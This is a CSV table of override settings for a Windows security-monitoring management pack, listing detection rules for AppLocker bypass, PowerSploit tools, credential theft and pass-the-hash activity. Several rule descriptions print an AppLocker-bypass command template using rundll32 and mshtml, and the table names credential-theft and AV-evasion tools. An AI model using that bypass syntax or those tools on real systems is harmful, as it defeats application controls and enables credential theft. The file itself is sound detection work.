ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
Security.Monitoring,Security.Monitoring.ForwardedEvents.DebugEscalation,Rule,Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WinRar,Rule,Security Monitoring:  WinRar in use,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WinRar,Rule,Security Monitoring:  WinRar in use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WinRar,Rule,Security Monitoring:  WinRar in use,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.BatchLogonInUse,Rule,Security Monitoring Threat Hunting: Batch Logon in use,"This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.BatchLogonInUse,Rule,Security Monitoring Threat Hunting: Batch Logon in use,"This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.BatchLogonInUse,Rule,Security Monitoring Threat Hunting: Batch Logon in use,"This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy,Rule,Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy,Rule,Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy,Rule,Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon,Rule,Security Monitoring Forwarded Events:  Special Group logon event,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon,Rule,Security Monitoring Forwarded Events:  Special Group logon event,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon,Rule,Security Monitoring Forwarded Events:  Special Group logon event,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeRemoteExpression,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeRemoteExpression,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeRemoteExpression,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeDLLInjection,Rule,Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeDLLInjection,Rule,Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeDLLInjection,Rule,Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.EventCollection.WdigestAuthentication,Rule,Security Monitoring: Collect WDigest Authentication Events,"If the proper audit policies are turned on, this rule will collect WDigest logons.  See https://blogs.technet.microsoft.com/kfalde/2014/11/02/kb2871997-and-wdigest-part-2/ for details",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.EventCollection.WdigestAuthentication,Rule,Security Monitoring: Collect WDigest Authentication Events,"If the proper audit policies are turned on, this rule will collect WDigest logons.  See https://blogs.technet.microsoft.com/kfalde/2014/11/02/kb2871997-and-wdigest-part-2/ for details",AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableExe3,string,Replacewithspecificexe,Replacewithspecificexe,Replacewithspecificexe,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableFilePath2,string,Replacewithspecificpath,Replacewithspecificpath,Replacewithspecificpath,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableExe1,string,Replacewithspecificexe,Replacewithspecificexe,Replacewithspecificexe,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableFilePath1,string,Replacewithspecificpath,Replacewithspecificpath,Replacewithspecificpath,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableFilePath3,string,Replacewithspecificpath,Replacewithspecificpath,Replacewithspecificpath,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableExe2,string,Replacewithspecificexe,Replacewithspecificexe,Replacewithspecificexe,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Severity,int,2,,,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Priority,int,1,,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App2,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App3,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App5,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App4,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App1,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousCMD,Rule,Security Monitoring:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousCMD,Rule,Security Monitoring:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousCMD,Rule,Security Monitoring:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SmartCardDisabled,Rule,Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon,Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SmartCardDisabled,Rule,Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon,Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.SmartCardDisabled,Rule,Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon,Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.FindAVSignature,Rule,Secuity Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.FindAVSignature,Rule,Secuity Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.FindAVSignature,Rule,Secuity Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.EnterpriseAdminChange,Rule,Security Monitoring:  Enterprise Admins membership has changed,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Accounts.EnterpriseAdminChange,Rule,Security Monitoring:  Enterprise Admins membership has changed,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.EnterpriseAdminChange,Rule,Security Monitoring:  Enterprise Admins membership has changed,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceCreatedonMemberServer,Rule,Security Monitoring: A service was created on a member server,"I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceCreatedonMemberServer,Rule,Security Monitoring: A service was created on a member server,"I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceCreatedonMemberServer,Rule,Security Monitoring: A service was created on a member server,"I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon,Rule,Security Monitoring Threat Hunting:  Special Group logon event,"This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon,Rule,Security Monitoring Threat Hunting:  Special Group logon event,"This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon,Rule,Security Monitoring Threat Hunting:  Special Group logon event,"This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Destination,Rule,Security Monitoring:  Possible WMI Remote Attempt Made To this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Destination,Rule,Security Monitoring:  Possible WMI Remote Attempt Made To this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Destination,Rule,Security Monitoring:  Possible WMI Remote Attempt Made To this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstTier1,Rule,Security Monitoring: Possible PtH Attack in Progress against tier 1,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstTier1,Rule,Security Monitoring: Possible PtH Attack in Progress against tier 1,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstTier1,Rule,Security Monitoring: Possible PtH Attack in Progress against tier 1,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeNinjaCopy,Rule,Security Monitoring:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeNinjaCopy,Rule,Security Monitoring:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeNinjaCopy,Rule,Security Monitoring:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WCE,Rule,Security Monitoring:  WCE in Use,"WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WCE,Rule,Security Monitoring:  WCE in Use,"WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WCE,Rule,Security Monitoring:  WCE in Use,"WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokePortScan,Rule,Security Monitoring Forwarded Events:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokePortScan,Rule,Security Monitoring Forwarded Events:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokePortScan,Rule,Security Monitoring Forwarded Events:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.FindAVSignature,Rule,Secuity Monitoring:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.FindAVSignature,Rule,Secuity Monitoring:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.FindAVSignature,Rule,Secuity Monitoring:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.UnexpectedShutdown,Rule,Security Monitoring:  Unexpected System Shutdown,"This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.UnexpectedShutdown,Rule,Security Monitoring:  Unexpected System Shutdown,"This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.UnexpectedShutdown,Rule,Security Monitoring:  Unexpected System Shutdown,"This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.EventCollection.NTLMV1,Rule,Security Monitoring: Collect NTLMV1 Events,Collection rule to collect all authentication events using NTLMv1 to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.EventCollection.NTLMV1,Rule,Security Monitoring: Collect NTLMV1 Events,Collection rule to collect all authentication events using NTLMv1 to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,AllowProxying,bool,FALSE,FALSE,FALSE,
